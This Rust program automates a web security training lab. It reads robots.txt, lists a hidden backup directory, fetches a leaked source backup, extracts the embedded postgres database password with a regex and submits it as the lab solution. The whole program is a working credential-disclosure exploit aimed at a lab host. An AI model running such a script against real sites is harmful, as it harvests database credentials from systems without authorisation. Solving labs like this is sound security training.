/**************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 3/9/2023
*
* Lab: Source code disclosure via backup files
*
* Steps: 1. Fetch /robots.txt file
*        2. List the hidden directory
*        3. Fetch the hidden backup file
*        4. Extract the key
*        5. Submit solution
*
***************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{collections::HashMap, time::Duration};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    let url = "https://0adf007f03dd1eb884b46ae100220011.web-security-academy.net"; // change this to your lab URL
    let client = build_client(); // build the client that will be used for all subsequent requests

    println!(
        "{} {}",
        "1. Fetching the robots.txt file..".white(),
        "OK".green()
    );
    let get_robots = client.get(format!("{url}/robots.txt")).send(); // check /robots.txt file
    if let Ok(res) = get_robots {
        // if response is OK
        let body = res.text().unwrap(); // get the body of the response
                                        // println!("{}", body);
        let hidden = capture_pattern("Disallow: (.*)", &body); // extract the hidden name
        if let Some(text) = hidden {
            // if the href is found
            println!(
                "{} {} => {}",
                "2. Searching for hidden files..".white(),
                "OK".green(),
                text.yellow()
            );
            let backup = client.get(format!("{url}{text}")).send(); // fetch the backup directory
            if let Ok(res) = backup {
                // if fetching is OK
                println!(
                    "{} {}",
                    "3. Fetching the backup directory..".white(),
                    "OK".green()
                );
                let body = res.text().unwrap(); // get the body of the backup directory
                let backup_file = capture_pattern("href='(.*)'>", &body); // extract path to the backup file
                if let Some(text) = backup_file {
                    // if the backup file is found
                    println!(
                        "{} {} => {}",
                        "4. Extracting the path to the backup file..".white(),
                        "OK".green(),
                        text.yellow()
                    );
                    let get_backup = client.get(format!("{url}{text}")).send(); // GET the backup file
                    if let Ok(res) = get_backup {
                        // if response is OK
                        println!(
                            "{} {}",
                            "5. Fetching the backup file..".white(),
                            "OK".green()
                        );
                        let body = res.text().unwrap();
                        let key_pattern =
                            capture_pattern(r#"\"postgres\",\s*\"postgres\",\s*\"(.*)\""#, &body); // extract the key
                        if let Some(text) = key_pattern {
                            // if the key is found
                            println!(
                                "{} {} => {}",
                                "6. Extracting key ..".white(),
                                "OK".green(),
                                text.yellow()
                            );
                            let submit_answer = client
                                .post(format!("{url}/submitSolution"))
                                .form(&HashMap::from([("answer", text)]))
                                .send(); // submit solution
                            if let Ok(res) = submit_answer {
                                println!(
                                    "{} {}",
                                    "7. Submitting solution..".white(),
                                    "OK".green()
                                );
                                println!(
                                    "{} {}",
                                    "🗹 Check your browser, it should be marked now as"
                                        .white()
                                        .bold(),
                                    "solved".green().bold()
                                )
                            } else {
                                println!("{}", "[!] Failed to submit solution".red())
                            }
                        } else {
                            println!("{}", "[!] Failed to find any keys".red())
                        }
                    } else {
                        println!("{}", "[!] Failed to fetch backup file".red())
                    }
                } else {
                    println!("{}", "[!] Failed to extract the backup file".red())
                }
            } else {
                println!("{}", "[!] Failed to list the hidden directory".red())
            }
        } else {
            println!("{}", "[!] Failed to extract the hidden directory".red())
        }
    } else {
        println!("{}", "[!] Failed to fetch /robots.txt file".red())
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap().captures(text);
    if pattern.is_some() {
        Some(pattern.unwrap().get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
